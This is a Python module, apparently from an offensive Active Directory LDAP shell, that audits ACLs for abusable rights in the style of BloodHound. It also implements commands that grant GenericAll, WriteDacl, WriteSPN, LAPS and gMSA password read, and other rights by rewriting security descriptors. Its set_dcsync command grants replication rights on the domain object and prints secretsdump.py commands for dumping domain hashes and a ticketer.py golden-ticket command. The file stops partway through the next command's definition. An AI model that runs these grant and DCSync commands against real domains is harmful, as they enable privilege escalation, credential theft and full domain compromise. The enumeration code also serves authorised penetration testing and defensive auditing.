#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ACL Mixin — ACL / 权限管理命令
包含 ACL 查询、敏感权限发现、BloodHound 风格 ACL 边缘审计、grant/revoke 操作。
"""

import ldap3
from ldap3.utils.conv import escape_filter_chars
from ldap3.protocol.microsoft import security_descriptor_control

from utils.ui import print_info, print_success, print_warn, print_found, print_error
from utils.helpers import (
    parse_args, check_result, get_entry,
    create_allow_ace, paged_search, print_table,
)
from impacket.ldap import ldaptypes
from impacket.uuid import string_to_bin


# ═══════════════════════════════════════════════════════════
#  ACL 边缘类型常量
# ═══════════════════════════════════════════════════════════

# Mask flags
MASK_CONTROL_ACCESS = 0x00000100   # ADS_RIGHT_DS_CONTROL_ACCESS (Extended Rights)
MASK_WRITE_PROP     = 0x00000020   # ADS_RIGHT_DS_WRITE_PROP
MASK_READ_PROP      = 0x00000010   # ADS_RIGHT_DS_READ_PROP
MASK_SELF           = 0x00000008   # ADS_RIGHT_DS_SELF (Validated Write)

# [Fix #4] INHERITED_ACE flag — revoke_ace 不应移除继承的 ACE
INHERITED_ACE_FLAG  = 0x10

# [Fix #1] ALLOW AceTypes — 只匹配这些类型，过滤 DENY ACE
_ALLOW_ACE_TYPES = {
    ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE,           # 0
    ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE,     # 5
}

# DCSync
REPL_GET_CHANGES     = '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
REPL_GET_CHANGES_ALL = '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'

# Extended Right GUIDs (ControlAccess mask)
GUID_FORCE_CHANGE_PASSWORD   = '00299570-246d-11d0-a768-00aa006e0529'
GUID_USER_ACCOUNT_RESTRICT   = '4c164200-20c0-11d0-a768-00aa006e0529'
GUID_VALIDATED_SPN           = 'f3a64788-5306-11d1-a9c5-0000f80367c1'
GUID_GP_LINK                 = 'f30e3bbe-9ff0-11d1-b603-0000f80367c1'
GUID_MEMBERSHIP              = 'bf9679c0-0de6-11d0-a285-00aa003049e2'  # WriteMembers / Self-Membership

# Schema Attribute GUIDs (ReadProp / WriteProp mask)
GUID_LAPS_PASSWORD           = '4c9928d7-d725-4fa6-a109-aba3ad8790e5'  # ms-Mcs-AdmPwd
GUID_GMSA_MANAGED_PASSWORD   = 'e362ed86-b728-0842-b27d-2dea7a9df218'  # ms-DS-ManagedPassword
GUID_SID_HISTORY             = '17eb4278-d167-11d0-b002-0000f80367c1'  # SID-History
GUID_USER_ACCOUNT_CONTROL    = 'bf967a68-0de6-11d0-a285-00aa003049e2'  # User-Account-Control
GUID_KEY_CREDENTIAL_LINK     = '5b47d60f-6090-40b2-9f37-2a4de88f3063'  # ms-DS-Key-Credential-Link

# ACL 审计排除 — 默认高权限 / 内置主体 (避免噪音输出)
_NOISY_RIDS = {
    512,   # Domain Admins
    513,   # Domain Users
    514,   # Domain Guests
    515,   # Domain Computers
    516,   # Domain Controllers
    517,   # Cert Publishers
    518,   # Schema Admins
    519,   # Enterprise Admins
    526,   # Key Admins
    527,   # Enterprise Key Admins
    553,   # RAS and IAS Servers
    544,   # Built-in Administrators
    548,   # Account Operators
    549,   # Server Operators
    550,   # Print Operators
    551,   # Backup Operators
    552,   # Replicator
    554,   # Pre-Windows 2000 Compatible Access
    558,   # Network Configuration Operators
    560,   # Windows Authorization Access Group
    561,   # Terminal Server License Servers
    562,   # Distributed COM Users
}

# [Fix #8] 补充常见噪音 SID
_NOISY_WELL_KNOWN = {
    'S-1-5-7',       # Anonymous
    'S-1-5-9',       # Enterprise Domain Controllers
    'S-1-5-18',      # SYSTEM (LocalSystem)
    'S-1-5-19',      # Local Service
    'S-1-5-20',      # Network Service
    'S-1-5-10',      # SELF (对象自身)
    'S-1-5-11',      # Authenticated Users
    'S-1-1-0',       # Everyone
    'S-1-5-6',       # Service
    'S-1-5-32-545',  # Users
    'S-1-5-32-546',  # Guests
    'S-1-5-32-555',  # Remote Desktop Users
    'S-1-3-0',       # Creator Owner
}

# AD 对象类 LDAP 过滤器 (user 查询需排除 computer，避免重复)
_CLASS_FILTERS = {
    'user': '(&(objectClass=user)(!(objectClass=computer)))',
    'computer': '(objectClass=computer)',
    'group': '(objectClass=group)',
    'organizationalUnit': '(objectClass=organizationalUnit)',
    'domain': '(objectCategory=domain)',
}


def _create_object_ace(privguid, sid, mask=MASK_CONTROL_ACCESS):
    """创建 ACCESS_ALLOWED_OBJECT_ACE (用于扩展权限/属性权限，默认 ControlAccess mask)"""
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = mask
    acedata['ObjectType'] = string_to_bin(privguid)
    acedata['InheritedObjectType'] = b''
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
    nace['Ace'] = acedata
    return nace


def _is_allow_ace(ace):
    """[Fix #1] 检查是否为 ALLOW 类型 ACE，过滤 DENY ACE"""
    return ace['AceType'] in _ALLOW_ACE_TYPES


class ACLMixin:
    """ACL / 权限命令集"""

    # ═══════════════════════════════════════════════════════════
    #  单对象 ACL 查看
    # ═══════════════════════════════════════════════════════════

    # ── object_acl ────────────────────────────────────────────
    def do_object_acl(self, line):
        """object_acl <object> — 查看 ACL (入站: 谁能控制该对象 + 出站: 该对象能控制谁)"""
        args = parse_args(line, 1, 1, "object_acl jsmith")

        controls = security_descriptor_control(sdflags=0x04)
        entry = get_entry(self.client, self.domain_dumper, args[0],
                          ['nTSecurityDescriptor', 'sAMAccountName', 'objectSid'],
                          controls=controls)
        if not entry:
            raise Exception("Object not found: %s" % args[0])

        target_sam = entry['sAMAccountName'].value
        target_dn = entry.entry_dn
        try:
            target_sid = str(entry['objectSid'].value)
        except Exception:
            target_sid = None

        try:
            sd_data = entry['nTSecurityDescriptor'].raw_values[0]
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
        except (IndexError, KeyError):
            raise Exception("Unable to read security descriptor")

        print_info("Object: %s" % target_dn)
        if target_sid:
            print_found("SID: %s" % target_sid)

        # Owner
        try:
            owner_raw = sd['OwnerSid']
            if hasattr(owner_raw, 'formatCanonical'):
                owner_sid = owner_raw.formatCanonical()
            else:
                from impacket.ldap.ldaptypes import LDAP_SID as _LDAP_SID
                sid_obj = _LDAP_SID()
                sid_obj.fromString(owner_raw)
                owner_sid = sid_obj.formatCanonical()
            resolved = self._resolve_sid(owner_sid)
            if resolved:
                print_found("Owner: %s (%s)" % (resolved, owner_sid))
            else:
                print_found("Owner: %s" % owner_sid)
        except Exception:
            pass

        excluded = self._get_acl_exclusions()

        # ═══ Inbound: 谁对该对象有权限 ═══
        print()
        print_info("Inbound ACL: Who can control '%s'" % target_sam)

        inbound_rows = []
        default_count = 0
        for ace in sd['Dacl'].aces:
            try:
                # [Fix #1] 只显示 ALLOW ACE
                if not _is_allow_ace(ace):
                    continue
                sid = ace['Ace']['Sid'].formatCanonical()
                mask = ace['Ace']['Mask']['Mask']
                if sid in excluded or sid == target_sid:
                    default_count += 1
                    continue
                perms = ', '.join(self._decode_mask(mask)) or 'None'
                resolved = self._resolve_sid(sid)
                inbound_rows.append([resolved if resolved else sid, perms])
            except Exception:
                default_count += 1

        if inbound_rows:
            print_success("Found %d custom ACE(s) (%d default filtered)" % (len(inbound_rows), default_count))
            print_table(['Trustee', 'Permissions'], inbound_rows)
        else:
            print_found("No custom ACEs (all %d are default)" % default_count)

        # ═══ Outbound: 该对象能控制谁 ═══
        if not target_sid:
            print()
            print_warn("Cannot scan outbound: object has no SID")
            return

        print()
        print_info("Outbound ACL: What '%s' can control" % target_sam)
        print_info("Scanning domain objects...")

        # 有价值的 ACL 边缘
        edge_defs = [
            (0x000f01ff,       None, "GenericAll"),
            (0x00020094,       None, "GenericWrite"),
            (0x00040000,       None, "WriteDacl"),
            (0x00080000,       None, "WriteOwner"),
            (MASK_CONTROL_ACCESS, None, "AllExtendedRights"),
            (MASK_CONTROL_ACCESS, GUID_FORCE_CHANGE_PASSWORD, "ForceChangePassword"),
            (MASK_WRITE_PROP,     GUID_MEMBERSHIP,            "AddMember"),
            (MASK_SELF,           GUID_MEMBERSHIP,            "AddSelf"),
            (MASK_READ_PROP,      GUID_LAPS_PASSWORD,         "ReadLAPSPassword"),
            (MASK_READ_PROP,      GUID_GMSA_MANAGED_PASSWORD, "ReadGMSAPassword"),
            (MASK_SELF,           GUID_VALIDATED_SPN,         "WriteSPN"),
            (MASK_CONTROL_ACCESS, GUID_USER_ACCOUNT_RESTRICT, "WriteAccountRestrictions"),
        ]
        # GUID → binary
        for i, (m, g, l) in enumerate(edge_defs):
            if g:
                edge_defs[i] = (m, string_to_bin(g), l)

        def _match_edges(ace, edge_defs):
            """匹配单条 ACE 的权限边缘"""
            rights = set()
            try:
                # [Fix #1] 只匹配 ALLOW ACE
                if not _is_allow_ace(ace):
                    return rights
                mask = ace['Ace']['Mask']['Mask']
                is_obj_ace = (ace['AceType'] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE)
                for edge_mask, edge_guid, edge_label in edge_defs:
                    if edge_guid is None:
                        # [Fix #3] AllExtendedRights 只匹配非 Object ACE
                        if edge_label == 'AllExtendedRights' and is_obj_ace:
                            continue
                        if mask & edge_mask == edge_mask:
                            rights.add(edge_label)
                    else:
                        if is_obj_ace and (mask & edge_mask):
                            try:
                                if ace['Ace']['ObjectType'] == edge_guid:
                                    rights.add(edge_label)
                            except (KeyError, IndexError):
                                pass
            except Exception:
                pass
            return rights

        # 按 target 合并 rights
        target_edges = {}

        # ── 扫描 user / computer / group ────────────────────
        for obj_class in ['user', 'computer', 'group']:
            obj_filter = _CLASS_FILTERS.get(obj_class, '(objectClass=%s)' % obj_class)
            entries = paged_search(
                self.client, self.domain_dumper.root, obj_filter,
                attributes=['sAMAccountName', 'nTSecurityDescriptor'],
                controls=controls,
            )
            for obj_entry in entries:
                obj_sam = obj_entry['sAMAccountName'].value
                if obj_sam == target_sam:
                    continue
                try:
                    obj_sd_data = obj_entry['nTSecurityDescriptor'].raw_values[0]
                    obj_sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=obj_sd_data)
                except (IndexError, KeyError):
                    continue

                found_rights = set()
                for ace in obj_sd['Dacl'].aces:
                    try:
                        sid = ace['Ace']['Sid'].formatCanonical()
                        if sid != target_sid:
                            continue
                        found_rights.update(_match_edges(ace, edge_defs))
                    except Exception:
                        continue

                if found_rights:
                    if 'GenericAll' in found_rights:
                        found_rights = {'GenericAll'}
                    if obj_sam not in target_edges:
                        target_edges[obj_sam] = set()
                    target_edges[obj_sam].update(found_rights)

        # ── 扫描域对象 (DCSync 等域级权限) ───────────────────
        print_info("Checking domain-level ACLs...")
        try:
            self.client.search(
                self.domain_dumper.root,
                '(objectCategory=domain)',
                attributes=['nTSecurityDescriptor'],
                controls=controls,
            )
            if self.client.entries:
                domain_sd_data = self.client.entries[0]['nTSecurityDescriptor'].raw_values[0]
                domain_sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=domain_sd_data)

                repl_changes_bin = string_to_bin(REPL_GET_CHANGES)
                repl_changes_all_bin = string_to_bin(REPL_GET_CHANGES_ALL)

                has_get_changes = False
                has_get_changes_all = False
                domain_rights = set()

                for ace in domain_sd['Dacl'].aces:
                    try:
                        sid = ace['Ace']['Sid'].formatCanonical()
                        if sid != target_sid:
                            continue
                        # [Fix #1] 只匹配 ALLOW ACE
                        if not _is_allow_ace(ace):
                            continue
                        mask = ace['Ace']['Mask']['Mask']
                        is_obj_ace = (ace['AceType'] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE)

                        # 标准边缘
                        domain_rights.update(_match_edges(ace, edge_defs))

                        # DCSync 检测
                        if is_obj_ace and (mask & MASK_CONTROL_ACCESS):
                            try:
                                obj_type = ace['Ace']['ObjectType']
                                if obj_type == repl_changes_bin:
                                    has_get_changes = True
                                elif obj_type == repl_changes_all_bin:
                                    has_get_changes_all = True
                            except (KeyError, IndexError):
                                pass
                    except Exception:
                        continue

                domain_label = 'DC (%s)' % self._extract_domain(self.domain_dumper.root)
                if has_get_changes and has_get_changes_all:
                    domain_rights.add('DCSync')
                # DCSync 隐含 AllExtendedRights，清理
                if 'DCSync' in domain_rights:
                    domain_rights.discard('AllExtendedRights')
                if 'GenericAll' in domain_rights:
                    domain_rights = {'GenericAll'}
                if domain_rights:
                    target_edges[domain_label] = domain_rights
        except Exception:
            pass

        # ── 输出 ─────────────────────────────────────────────
        if target_edges:
            outbound_rows = []
            for t_sam in sorted(target_edges):
                rights = sorted(target_edges[t_sam])
                outbound_rows.append([t_sam, ', '.join(rights)])
            print_success("Found %d outbound edge(s)" % len(outbound_rows))
            print_table(['Target', 'Rights'], outbound_rows)
        else:
            print_found("No interesting outbound ACL edges found")
        print()

    # ═══════════════════════════════════════════════════════════
    #  Mask-based 权限发现
    # ═══════════════════════════════════════════════════════════

    # ── find_generic_all ──────────────────────────────────────
    def do_find_generic_all(self, line):
        """find_generic_all — 发现 GenericAll 权限"""
        self._find_ace_with_mask(0x000f01ff, "GenericAll")

    # ── find_generic_write ────────────────────────────────────
    def do_find_generic_write(self, line):
        """find_generic_write — 发现 GenericWrite 权限"""
        self._find_ace_with_mask(0x00020094, "GenericWrite")

    # ── find_write_owner ──────────────────────────────────────
    def do_find_write_owner(self, line):
        """find_write_owner — 发现 WriteOwner 权限"""
        self._find_ace_with_mask(0x00080000, "WriteOwner")

    # ── find_write_dacl ───────────────────────────────────────
    def do_find_write_dacl(self, line):
        """find_write_dacl — 发现 WriteDacl 权限"""
        self._find_ace_with_mask(0x00040000, "WriteDacl")

    # ── find_all_extended_rights ──────────────────────────────
    def do_find_all_extended_rights(self, line):
        """find_all_extended_rights — 发现 AllExtendedRights"""
        self._find_ace_with_mask(MASK_CONTROL_ACCESS, "AllExtendedRights")

    # ═══════════════════════════════════════════════════════════
    #  GUID-based 权限发现 (Object ACE)
    # ═══════════════════════════════════════════════════════════

    # ── find_force_change_password ────────────────────────────
    def do_find_force_change_password(self, line):
        """find_force_change_password — 发现 ForceChangePassword 权限"""
        self._find_object_ace(MASK_CONTROL_ACCESS, GUID_FORCE_CHANGE_PASSWORD,
                              "ForceChangePassword", obj_classes=['user', 'computer'])

    # ── find_add_member ───────────────────────────────────────
    def do_find_add_member(self, line):
        """find_add_member — 发现可以向组添加成员的权限"""
        self._find_object_ace(MASK_WRITE_PROP, GUID_MEMBERSHIP,
                              "AddMember", obj_classes=['group'])

    # ── find_add_self ─────────────────────────────────────────
    def do_find_add_self(self, line):
        """find_add_self — 发现 Self-Membership 权限"""
        self._find_object_ace(MASK_SELF, GUID_MEMBERSHIP,
                              "AddSelf", obj_classes=['group'])

    # ── find_read_laps ────────────────────────────────────────
    def do_find_read_laps(self, line):
        """find_read_laps — 发现可以读取 LAPS 密码的权限"""
        self._find_object_ace(MASK_READ_PROP, GUID_LAPS_PASSWORD,
                              "ReadLAPSPassword", obj_classes=['computer'])

    # ── find_read_gmsa ────────────────────────────────────────
    def do_find_read_gmsa(self, line):
        """find_read_gmsa — 发现可以读取 GMSA 密码的权限"""
        self._find_object_ace(MASK_READ_PROP, GUID_GMSA_MANAGED_PASSWORD,
                              "ReadGMSAPassword", obj_classes=['user', 'computer'])

    # ── find_gp_link ──────────────────────────────────────────
    def do_find_gp_link(self, line):
        """find_gp_link — 发现 GpLink 权限"""
        # [Fix #7] 只搜 OU 和 domain (site 在 Configuration NC，Domain NC 搜不到)
        self._find_object_ace(MASK_CONTROL_ACCESS, GUID_GP_LINK,
                              "GpLink", obj_classes=['organizationalUnit', 'domain'])

    # ── find_write_spn ────────────────────────────────────────
    def do_find_write_spn(self, line):
        """find_write_spn — 发现 WriteSPN 权限"""
        self._find_object_ace(MASK_SELF, GUID_VALIDATED_SPN,
                              "WriteSPN", obj_classes=['user', 'computer'])

    # ── find_write_account_restrictions ───────────────────────
    def do_find_write_account_restrictions(self, line):
        """find_write_account_restrictions — 发现 WriteAccountRestrictions 权限"""
        self._find_object_ace(MASK_CONTROL_ACCESS, GUID_USER_ACCOUNT_RESTRICT,
                              "WriteAccountRestrictions", obj_classes=['user', 'computer'])

    # ═══════════════════════════════════════════════════════════
    #  Attribute / SD-based 权限发现
    # ═══════════════════════════════════════════════════════════

    # ── find_sid_history ──────────────────────────────────────
    def do_find_sid_history(self, line):
        """find_sid_history — 发现具有 SIDHistory 的对象"""
        print_info("Searching for objects with SIDHistory...")
        entries = paged_search(
            self.client, self.domain_dumper.root,
            '(sIDHistory=*)',
            attributes=['sAMAccountName', 'sIDHistory'],
        )
        if not entries:
            print_warn("No objects with SIDHistory found")
            return

        rows = []
        for entry in entries:
            sam = entry['sAMAccountName'].value
            sids = entry['sIDHistory'].values
            for sid in sids:
                resolved = self._resolve_sid(str(sid))
                rows.append([sam, resolved or '', str(sid)])

        print_table(['Object', 'Resolved', 'SIDHistory'], rows)

    # ── find_owns ─────────────────────────────────────────────
    def do_find_owns(self, line):
        """find_owns — 发现非默认 Owner 的对象"""
        print_info("Searching for objects with non-default Owner...")
        controls = security_descriptor_control(sdflags=0x04)
        excluded = self._get_acl_exclusions()
        rows = []

        for obj_class in ['user', 'computer', 'group']:
            # [Fix #2] 使用 paged_search 避免截断
            entries = paged_search(
                self.client, self.domain_dumper.root,
                _CLASS_FILTERS.get(obj_class, '(objectClass=%s)' % obj_class),
                attributes=['sAMAccountName', 'nTSecurityDescriptor'],
                controls=controls,
            )
            for entry in entries:
                try:
                    sd_data = entry['nTSecurityDescriptor'].raw_values[0]
                    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
                    owner_sid = sd['OwnerSid'].formatCanonical()
                    if owner_sid in excluded:
                        continue
                    sam = entry['sAMAccountName'].value
                    resolved = self._resolve_sid(owner_sid)
                    rows.append([sam, resolved or owner_sid, owner_sid])
                except (IndexError, KeyError):
                    continue

        if not rows:
            print_warn("No objects with non-default Owner found")
            return

        print_table(['Object', 'Owner', 'OwnerSID'], rows)

    # ── find_interesting_acl (综合审计) ───────────────────────
    def do_find_interesting_acl(self, line):
        """find_interesting_acl — 综合敏感 ACL 审计 (BloodHound-style)"""
        print_info("Scanning for interesting ACLs (BloodHound-style)...")

        edge_defs = [
            (0x000f01ff,          None,                   "GenericAll",              None),
            (0x00020094,          None,                   "GenericWrite",            None),
            (0x00040000,          None,                   "WriteDacl",               None),
            (0x00080000,          None,                   "WriteOwner",              None),
            (MASK_CONTROL_ACCESS, None,                   "AllExtendedRights",       None),
            (MASK_CONTROL_ACCESS, GUID_FORCE_CHANGE_PASSWORD, "ForceChangePassword", ['user', 'computer']),
            (MASK_WRITE_PROP,     GUID_MEMBERSHIP,        "AddMember",               ['group']),
            (MASK_SELF,           GUID_MEMBERSHIP,        "AddSelf",                 ['group']),
            (MASK_READ_PROP,      GUID_LAPS_PASSWORD,     "ReadLAPSPassword",        ['computer']),
            (MASK_READ_PROP,      GUID_GMSA_MANAGED_PASSWORD, "ReadGMSAPassword",    ['user', 'computer']),
            (MASK_SELF,           GUID_VALIDATED_SPN,     "WriteSPN",                ['user', 'computer']),
            (MASK_CONTROL_ACCESS, GUID_USER_ACCOUNT_RESTRICT, "WriteAccountRestrictions", ['user', 'computer']),
        ]

        for i, (mask, guid, label, classes) in enumerate(edge_defs):
            if guid:
                edge_defs[i] = (mask, string_to_bin(guid), label, classes)

        controls = security_descriptor_control(sdflags=0x04)
        excluded = self._get_acl_exclusions()
        rows = []

        for obj_class in ['user', 'computer', 'group']:
            # [Fix #2] 使用 paged_search 避免截断
            entries = paged_search(
                self.client, self.domain_dumper.root,
                _CLASS_FILTERS.get(obj_class, '(objectClass=%s)' % obj_class),
                attributes=['sAMAccountName', 'nTSecurityDescriptor'],
                controls=controls,
            )
            for entry in entries:
                try:
                    sd_data = entry['nTSecurityDescriptor'].raw_values[0]
                    sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
                except (IndexError, KeyError):
                    continue

                target_sam = entry['sAMAccountName'].value

                for ace in sd['Dacl'].aces:
                    try:
                        # [Fix #1] 只匹配 ALLOW ACE
                        if not _is_allow_ace(ace):
                            continue
                        sid = ace['Ace']['Sid'].formatCanonical()
                        if sid in excluded:
                            continue
                        mask = ace['Ace']['Mask']['Mask']
                        is_object_ace = (ace['AceType'] == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE)

                        for edge_mask, edge_guid, edge_label, edge_classes in edge_defs:
                            if edge_classes and obj_class not in edge_classes:
                                continue

                            if edge_guid is None:
                                # [Fix #3] AllExtendedRights 只匹配非 Object ACE
                                if edge_label == 'AllExtendedRights' and is_object_ace:
                                    continue
                                if mask & edge_mask == edge_mask:
                                    resolved = self._resolve_sid(sid)
                                    rows.append([target_sam, resolved or sid, edge_label])
                            else:
                                if is_object_ace and (mask & edge_mask):
                                    try:
                                        if ace['Ace']['ObjectType'] == edge_guid:
                                            resolved = self._resolve_sid(sid)
                                            rows.append([target_sam, resolved or sid, edge_label])
                                    except (KeyError, IndexError):
                                        pass
                    except Exception:
                        continue

        # [Fix #6] 扫描域对象 — DCSync 检测
        print_info("Checking domain-level ACLs for DCSync...")
        try:
            self.client.search(
                self.domain_dumper.root,
                '(objectCategory=domain)',
                attributes=['nTSecurityDescriptor'],
                controls=controls,
            )
            if self.client.entries:
                domain_sd_data = self.client.entries[0]['nTSecurityDescriptor'].raw_values[0]
                domain_sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=domain_sd_data)

                repl_gc_bin = string_to_bin(REPL_GET_CHANGES)
                repl_gca_bin = string_to_bin(REPL_GET_CHANGES_ALL)

                # 收集 SID 的 DCSync 组件
                dcsync_candidates = {}
                for ace in domain_sd['Dacl'].aces:
                    try:
                        if not _is_allow_ace(ace):
                            continue
                        sid = ace['Ace']['Sid'].formatCanonical()
                        if sid in excluded:
                            continue
                        if ace['AceType'] != ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE:
                            continue
                        mask = ace['Ace']['Mask']['Mask']
                        if not (mask & MASK_CONTROL_ACCESS):
                            continue
                        obj_type = ace['Ace']['ObjectType']
                        if obj_type == repl_gc_bin:
                            dcsync_candidates.setdefault(sid, {'gc': False, 'gca': False})
                            dcsync_candidates[sid]['gc'] = True
                        elif obj_type == repl_gca_bin:
                            dcsync_candidates.setdefault(sid, {'gc': False, 'gca': False})
                            dcsync_candidates[sid]['gca'] = True
                    except Exception:
                        continue

                domain_label = 'DC (%s)' % self._extract_domain(self.domain_dumper.root)
                for sid, info in dcsync_candidates.items():
                    if info['gc'] and info['gca']:
                        resolved = self._resolve_sid(sid)
                        rows.append([domain_label, resolved or sid, 'DCSync'])
        except Exception:
            pass

        if not rows:
            print_warn("No interesting ACLs found")
            return

        print_success("Found %d interesting ACL edge(s)" % len(rows))
        print_table(['Target', 'Trustee', 'Edge'], rows)

    # ═══════════════════════════════════════════════════════════
    #  ACL 写入操作
    # ═══════════════════════════════════════════════════════════

    # ── grant_control ─────────────────────────────────────────
    def do_grant_control(self, line):
        """grant_control <target> <grantee> — 授予完全控制权限 (GenericAll)"""
        args = parse_args(line, 2, 2, "grant_control <target> <grantee>")
        self._grant_ace(args[0], args[1],
                        lambda sid: create_allow_ace(sid), 'GenericAll')

    # ── grant_generic_write ─────────────────────────────────
    def do_grant_generic_write(self, line):
        """grant_generic_write <target> <grantee> — 授予 GenericWrite 权限"""
        args = parse_args(line, 2, 2, "grant_generic_write <target> <grantee>")
        self._grant_ace(args[0], args[1],
                        lambda sid: create_allow_ace(sid, mask=0x00020094), 'GenericWrite')

    # ── grant_write_dacl ────────────────────────────────────
    def do_grant_write_dacl(self, line):
        """grant_write_dacl <target> <grantee> — 授予 WriteDacl 权限"""
        args = parse_args(line, 2, 2, "grant_write_dacl <target> <grantee>")
        self._grant_ace(args[0], args[1],
                        lambda sid: create_allow_ace(sid, mask=0x00040000), 'WriteDacl')

    # ── grant_write_owner ───────────────────────────────────
    def do_grant_write_owner(self, line):
        """grant_write_owner <target> <grantee> — 授予 WriteOwner 权限"""
        args = parse_args(line, 2, 2, "grant_write_owner <target> <grantee>")
        self._grant_ace(args[0], args[1],
                        lambda sid: create_allow_ace(sid, mask=0x00080000), 'WriteOwner')

    # ── grant_all_extended_rights ───────────────────────────
    def do_grant_all_extended_rights(self, line):
        """grant_all_extended_rights <target> <grantee> — 授予 AllExtendedRights"""
        args = parse_args(line, 2, 2, "grant_all_extended_rights <target> <grantee>")
        self._grant_ace(args[0], args[1],
                        lambda sid: create_allow_ace(sid, mask=MASK_CONTROL_ACCESS), 'AllExtendedRights')

    # ── grant_force_change_password ─────────────────────────
    def do_grant_force_change_password(self, line):
        """grant_force_change_password <target> <grantee> — 授予 ForceChangePassword"""
        args = parse_args(line, 2, 2, "grant_force_change_password <target> <grantee>")
        self._grant_ace(args[0], args[1],
                        lambda sid: _create_object_ace(GUID_FORCE_CHANGE_PASSWORD, sid),
                        'ForceChangePassword')

    # ── grant_add_member ────────────────────────────────────
    def do_grant_add_member(self, line):
        """grant_add_member <group> <grantee> — 授予向组添加成员的权限"""
        args = parse_args(line, 2, 2, "grant_add_member <group> <grantee>")
        self._grant_ace(args[0], args[1],
                        lambda sid: _create_object_ace(GUID_MEMBERSHIP, sid, mask=MASK_WRITE_PROP),
                        'AddMember')

    # ── grant_add_self ──────────────────────────────────────
    def do_grant_add_self(self, line):
        """grant_add_self <group> <grantee> — 授予将自身加入组的权限"""
        args = parse_args(line, 2, 2, "grant_add_self <group> <grantee>")
        self._grant_ace(args[0], args[1],
                        lambda sid: _create_object_ace(GUID_MEMBERSHIP, sid, mask=MASK_SELF),
                        'AddSelf')

    # ── grant_write_spn ─────────────────────────────────────
    def do_grant_write_spn(self, line):
        """grant_write_spn <target> <grantee> — 授予 WriteSPN (Targeted Kerberoast)"""
        args = parse_args(line, 2, 2, "grant_write_spn <target> <grantee>")
        self._grant_ace(args[0], args[1],
                        lambda sid: _create_object_ace(GUID_VALIDATED_SPN, sid, mask=MASK_SELF),
                        'WriteSPN')

    # ── grant_write_account_restrictions ────────────────────
    def do_grant_write_account_restrictions(self, line):
        """grant_write_account_restrictions <target> <grantee> — 授予 WriteAccountRestrictions"""
        args = parse_args(line, 2, 2, "grant_write_account_restrictions <target> <grantee>")
        self._grant_ace(args[0], args[1],
                        lambda sid: _create_object_ace(GUID_USER_ACCOUNT_RESTRICT, sid),
                        'WriteAccountRestrictions')

    # ── grant_read_laps ─────────────────────────────────────
    def do_grant_read_laps(self, line):
        """grant_read_laps <computer> <grantee> — 授予读取 LAPS 密码的权限"""
        args = parse_args(line, 2, 2, "grant_read_laps <computer> <grantee>")
        self._grant_ace(args[0], args[1],
                        lambda sid: _create_object_ace(GUID_LAPS_PASSWORD, sid, mask=MASK_READ_PROP),
                        'ReadLAPSPassword')

    # ── grant_read_gmsa ─────────────────────────────────────
    def do_grant_read_gmsa(self, line):
        """grant_read_gmsa <target> <grantee> — 授予读取 GMSA 密码的权限"""
        args = parse_args(line, 2, 2, "grant_read_gmsa <target> <grantee>")
        self._grant_ace(args[0], args[1],
                        lambda sid: _create_object_ace(GUID_GMSA_MANAGED_PASSWORD, sid, mask=MASK_READ_PROP),
                        'ReadGMSAPassword')

    # ── set_dcsync ────────────────────────────────────────────
    def do_set_dcsync(self, line):
        """set_dcsync <user> — 授予用户 DCSync 权限"""
        args = parse_args(line, 1, 1, "set_dcsync jsmith")

        target = get_entry(self.client, self.domain_dumper, args[0],
                           ['sAMAccountName', 'objectSid'])
        if not target:
            raise Exception("Target not found: %s" % args[0])

        target_sid = str(target['objectSid'].value)
        target_name = target['sAMAccountName'].value
        print_found("Target: %s (%s)" % (target_name, target_sid))

        controls = security_descriptor_control(sdflags=0x04)
        self.client.search(
            self.domain_dumper.root,
            '(objectCategory=domain)',
            attributes=['nTSecurityDescriptor'],
            controls=controls,
        )
        if not self.client.entries:
            raise Exception("Domain object not found")

        domain_entry = self.client.entries[0]
        sd_data = domain_entry['nTSecurityDescriptor'].raw_values[0]
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)

        sd['Dacl'].aces.append(_create_object_ace(REPL_GET_CHANGES, target_sid))
        sd['Dacl'].aces.append(_create_object_ace(REPL_GET_CHANGES_ALL, target_sid))

        self.client.modify(
            domain_entry.entry_dn,
            {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [sd.getData()]]},
            controls=controls,
        )
        if self.client.result['result'] == 0:
            print_success("DCSync privileges granted to %s" % target_name)
            from utils.helpers import get_domain_name
            domain = get_domain_name(self.domain_dumper.root)
            dc_ip = self.dc_address
            print_warn("Exploit Tips:")
            print_found("  1. secretsdump.py '%s/%s:PASSWORD'@%s" % (domain, target_name, dc_ip))
            print_found("  2. secretsdump.py '%s/%s:PASSWORD'@%s -just-dc-ntlm" % (domain, target_name, dc_ip))
            print_found("  3. secretsdump.py '%s/%s:PASSWORD'@%s -just-dc-user krbtgt" % (domain, target_name, dc_ip))
            print_found("  4. ticketer.py -domain %s -dc-ip %s -nthash <krbtgt_hash> -domain-sid <sid> user" % (domain, dc_ip))
        else:
            print_error("Failed: %s" % self.client.result.get('description', ''))

    # ── get_dcsync ────────────────────────────────────────────
    def do_get_dcsync(self, line):
        """get_dcsync — 查看具有 DCSync 权限的对象"""
